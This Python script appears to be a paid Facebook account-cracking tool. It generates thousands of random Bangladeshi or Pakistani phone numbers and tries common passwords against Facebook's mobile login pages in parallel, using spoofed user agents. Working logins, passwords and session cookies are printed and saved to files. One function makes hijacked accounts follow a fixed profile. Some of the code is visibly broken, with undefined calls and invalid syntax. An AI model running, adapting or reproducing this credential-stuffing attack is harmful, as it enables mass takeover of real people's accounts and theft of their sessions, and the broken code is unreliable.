
#-------------MAIN>MENU-------------#
import os
import os
import sys
import time
import requests
import uuid
os.system('git pull')
def o():
    os.system('clear')
    print(setu)
   # print(lov)
    #
    print("\033[1;92m[\033[1;92m\033[1;34m1\033[1;92m]START RANDOM NUMBER CLONE")
    print("[\033[1;92m\033[1;34m2\033[1;92m]START RANDOM NUMBER CLONE")
    print("[\033[1;92m\033[1;34m3\033[1;92m]CONTACT ADMIN")
    print("[\033[38;5;208m\033[1;34mE\033[1;92m]EXIT")
    ALAMIN =input("\033[1;92m[©]\033[1;92mCHOOSE : ")
    if ALAMIN == '1':
    	M1()
    if ALAMIN == '2':
        M2()
    if ALAMIN == '3':
        os.system('xdg-open https://m.facebook.com/ALAMIN.404.ALAMIN')

import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')

#------------------APK<>CHECKER-------------------#    
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\033[1;91m%s[%s!%s] %sNot Found Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🔥] %s \x1b[1;95m Your Active Apps     :{GREEN}'%(GREEN))
        for i in range(len(game)):
            print(f"\033[\033[1;92m[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\033[1;96m%s[%s!%s] %sNot Found Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🔥] %s \x1b[1;95m  Your Expired Apps     :{RED}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
            
            

 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class print:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.0010)
            
            

#-------------------COLOR----------------#
RED = '\x1b[38;5;208m'
WHITE = '\033[1;92m'
GREEN = '\033[\033[1;92m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[38;5;46m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]

gg = random.choice(my_color)
bi = random.choice([P,M,K,B,U,O,N,H])
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()

os.system('clear')
print('\x1b[1;32m             BANGLADESH CLONING START PLEASE WAIT  \033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●')
time.sleep(5)

#-------------------mylover-------------------#
setu="""
\033[1;37m     ###    ##          ###    ##     ## #### ##    ## 
\033[1;37m    ## ##   ##         ## ##   ###   ###  ##  ###   ## 
\033[1;37m   ##   ##  ##        ##   ##  #### ####  ##  ####  ## 
 \033[1;37m ##     ## ##       ##     ## ## ### ##  ##  ## ## ## 
\033[1;37m  ######### ##       ######### ##     ##  ##  ##  #### 
 \033[1;37m ##     ## ##       ##     ## ##     ##  ##  ##   ### 
 \033[1;37m ##     ## ######## ##     ## ##     ## #### ##    ##      
\033[1;37m----------------------------------------------------------------
  \033[1;37mAUTHOR    : ALAMIN ANCHAR  
  \033[1;37mGITHUB    : MrALAMIN156
  \033[1;37mFACEBOOK  : ALAMIN ANCHAR 
  \033[1;37mTOOL NAME : FILE CLONE  
  \033[1;37mTOOL TYPE : PAID 
  \033[1;37mVERSION   : 1.89.0
\033[1;37m----------------------------------------------------------------"""
      

try:
    print("\033[\033[1;92m\nTOOL UPDATE SUCCESSFUL\n")
    time.sleep(2)
    ALAMIN()
    print("\033[1;91m\nYOUR DEVICE IS NOT SUPPORTED!\n")
    ALAMIN()
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mPROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN\033[0;92m')


loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(setu)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
cokbrut=[]
session = requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox) 
except Exception as e:
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[MX')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(100000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
lin= 40* '-'

	

	
def M1():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(setu)
  #  print(lov)   
    print("\033[1;92mWHAT IS YOUR NAME?")
    name=input("\033[1;92mUSER NAME : \033[1;92m")
    os.system("clear")
    print(setu)
   # print(lov)
   # 
    print('ENTER YOUR COUNTRY CODE')
    print('[BD CODE] \033[1;92m> \033[1;92m017 - 019 - 018 - 015')
    print('[PK CODE] \033[1;92m> \033[1;92m+92300 - +92301 - +92304 - +92305')
    code = input('\033[1;92mCHOOSE YOUR COUNTRY CODE : ')
    os.system('clear')
    print(setu)
    limit = int(input('\033[1;92m[✔]EXAMPLE: 3000, 5000, 15000, 20000\n\033[1;92mCHOOSE CLONING LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as ALAMIN:
        clear()
        tl = str(len(user))
       # print(lov)       
        print(f"\033[1;92m[\033[1;34m✔\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
        print(f"\033[1;92m[\033[1;34m✔\033[1;92m]\033[0;92mAGENTS         \033[1;34m: \033[0;34m"+str(len(ugen)))
        print(f"\033[1;92m[\033[1;34m✔\033[1;92m]\033[0;92mCRACK ID       \033[1;34m: \033[0;97m"+tl+" ")
        print(f"\033[1;92m[\033[1;34m✔\033[1;92m]\033[0;92mSIM CODE       \033[1;34m: \033[0;97m"+code)
        print(f"\033[1;92m[\033[1;34m✔\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{ha}/{bu}/{ta} ~ {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f"\x1b[1;92m\x1b[1;97m----------------------------------------------------------------\x1b[1;91m\033[47m\033[1;30m\033[40m\033[00m\x1b[1;91m\x1b[1;92m\x1b[1;91m ")
        for love in user:
            pwx = [love, 'bangladesh','i love you','free fire','Bangladesh','fflover','khan123''freefire']
            uid = code+love
            ALAMIN.submit(bcrack,uid,pwx,tl)
    print(' CRACK PROCESS HAS BEEN COMPLETED ')
def bcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            gg = random.choice(bi)
            session = requests.Session()
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'www.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://www.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="106", "Not)A;Brand";v="24", "Chromium";v="106"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'none',
            "sec-fetch-user": '?1',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\033[1;92m[\033[1;92mALAMIN-OK\033[1;92m] \033[1;92m' +uid+ ' | ' +ps+    '  \n'+tahunng(cid))
                print('\033[1;92m[\033[1;92m✓\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
                open('/sdcard/ALAMIN-PRO-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('   \033[1;32m(ALAMIN=OK [💚] ' +uid+ ' | ' +ps+'\n'+tahunng(uid))
                open('/sdcard/ALAMIN=CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[ALAMIN-%s/%s] \033[1;92m[OK-%s]\033[1;92m[CP-%s] \r'%(P,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
        
def M2():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(setu)
    print("WHAT IS YOUR NAME?")
    name=input("USER NAME : \033[1;92m")
    os.system("clear")
    print(setu)
    print('ENTER YOUR COUNTRY CODE')
    print('[BD CODE] \033[1;92m> \033[1;92m017 - 019 - 018 - 015')
    print('[PK CODE] \033[1;92m> \033[1;92m+92300 - +92301 - +92304 - +92305')
    code = input('\033[1;92mCHOOSE YOUR COUNTRY CODE : ')
    os.system('clear')
    print(setu)
    limit = int(input('\033[1;92m[✔]EXAMPLE: 3000, 5000, 15000, 20000\n\033[1;92mCHOOSE CLONING LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as ALAMIN:
        clear()
        tl = str(len(user))
        print(f"\033[1;92m[\033[1;34m✔\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
        print(f"\033[1;92m[\033[1;34m✔\033[1;92m]\033[0;92mAGENTS         \033[1;34m: \033[0;34m"+str(len(ugen)))
        print(f"\033[1;92m[\033[1;34m✔\033[1;92m]\033[0;92mCRACK ID       \033[1;34m: \033[0;97m"+tl+" ")
        print(f"\033[1;92m[\033[1;34m✔\033[1;92m]\033[0;92mSIM CODE       \033[1;34m: \033[0;97m"+code)
        print(f"\033[1;92m[\033[1;34m✔\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{ha}/{bu}/{ta} ~ {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f"\x1b[1;91m\x1b[1;97m----------------------------------------------------------------\x1b[1;91m\033[47m\033[1;30m\033[40m\033[00m\x1b[1;91m\x1b[1;92m\x1b[1;91m● ")
        for love in user:
            pwx = [love, 'bangladesh','i love you','free fire','Bangladesh','fflover','khan123''i sex you']
            uid = code+love
            ALAMIN.submit(rcrack,uid,pwx,tl)
    print(' CRACK PROCESS HAS BEEN COMPLETED ')
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()            
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [ALAMIN-OK [🌹]  '+uid+' | '+ps+'\33[0;92m'+tahunng(uid))
                print(f'\r\033[1;92m [💚] COOKIE : '+coki)
                cek_apk(session,coki)
                oks.append(uid)
                open('/sdcard/ALAMIN-OK.txt', 'a').write(uid+' | '+ps+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[CP] {uid}|{ps}" ---- +tahunng(uid))
                print(f'User Agent  : {kk}{ua}{P}           \n')
                open('/sdcard/ALAMIN -CP.txt', 'a').write( uid+' | '+ps+' \n'+tahunng(uid))
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[ALAMIN-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(P,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
        
    except:
        pass
        

o() 

